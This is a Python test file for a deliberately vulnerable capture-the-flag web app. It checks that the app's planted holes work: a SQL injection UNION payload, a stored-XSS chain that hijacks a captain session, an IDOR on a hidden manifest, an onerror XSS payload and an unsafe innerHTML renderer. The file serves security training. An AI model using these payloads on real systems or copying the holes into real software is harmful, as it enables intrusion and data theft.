"""Exercise the deliberately vulnerable, isolated station workflows."""
import json
from pathlib import Path
from urllib.parse import quote
from test_web import WebTests, ROOT, PASSWORD, CAPTAIN_PASSWORD

from baseline import read_baseline, restore


class ChallengeTests(WebTests):
    def test_roster_search_exposes_event_only_through_union(self):
        restore(self.db, read_baseline(ROOT/'baseline/board.json'))
        self.assertEqual(self.request('/api/roster')[0], 401)
        self.login()
        normal = self.request('/api/roster?q=Hong')[1]
        self.assertIn('"crew_name": "Jin Hong"', normal)
        self.assertNotIn('LAST_CONTACT', normal)
        injection = "%' UNION SELECT event_code,observed_at,detail FROM station_events --"
        data = json.loads(self.request('/api/roster?q='+quote(injection))[1])
        self.assertTrue(any('CTF{LAST_CONTACT_' in row['station'] for row in data['results']))
        for table, columns in [('challenge_secrets', "name,value,'x'"),
                               ('manifests', "title,data,'x'")]:
            cross_stage = "%' UNION SELECT " + columns + " FROM " + table + " --"
            self.assertEqual(self.request('/api/roster?q='+quote(cross_stage))[0], 400)

    def test_ticket_xss_chain_reaches_restricted_manifest(self):
        restore(self.db, read_baseline(ROOT/'baseline/board.json'))
        self.login()
        created = json.loads(self.request('/api/tickets', {'subject':'Vent fault','description':'Inspect valve'})[1])
        ticket_id = created['id']
        self.assertEqual(self.request('/api/tickets/'+str(ticket_id))[0], 200)
        # Crew cannot mint an operations grant or list manifests on their own.
        self.assertEqual(self.request('/api/ops/grants', {})[0], 403)
        self.assertEqual(self.request('/api/manifests')[0], 403)
        # The captain session that the stored XSS hijacks mints the grant...
        self.captain_login()
        grant_response = json.loads(self.request('/api/ops/grants', {})[1])
        self.assertNotIn('flag', grant_response)  # The grant is a key, not a flag.
        grant = grant_response['access']
        # ...and the grant unlocks the restricted manifest through the detail
        # IDOR, even though the listing hides record 2103.
        listing = json.loads(self.request('/api/manifests?access='+grant)[1])['manifests']
        self.assertNotIn(2103, [row['id'] for row in listing])
        hidden = self.request('/api/manifests/2103?access='+grant)
        self.assertEqual(hidden[0], 200)
        self.assertIn('CTF{O2_RESERVE_', hidden[1])
        # The payload exfiltrates by commenting the manifest back onto the crew
        # ticket, which the crew owner can then read without any captain access.
        self.assertEqual(self.request('/api/tickets/comment', {'ticket_id':ticket_id,'content':hidden[1]})[0], 201)
        self.login()
        comments = json.loads(self.request('/api/tickets/'+str(ticket_id))[1])['comments']
        self.assertIn('CTF{O2_RESERVE_', comments[0]['content'])

    def test_ticket_page_contains_legacy_rich_text_renderer(self):
        self.login()
        ticket_id = json.loads(self.request('/api/tickets', {'subject':'Test','description':'<img src=x onerror=alert(1)>'})[1])['id']
        self.assertIn("'unsafe-inline'", self.request('/tickets/'+str(ticket_id))[2]['Content-Security-Policy'])
        script = self.request('/static/station.js')[1]
        self.assertIn("$('ticket-description').innerHTML = data.ticket.description", script)
        self.assertIn('<img src=x onerror=alert(1)>', self.request('/api/tickets/'+str(ticket_id))[1])
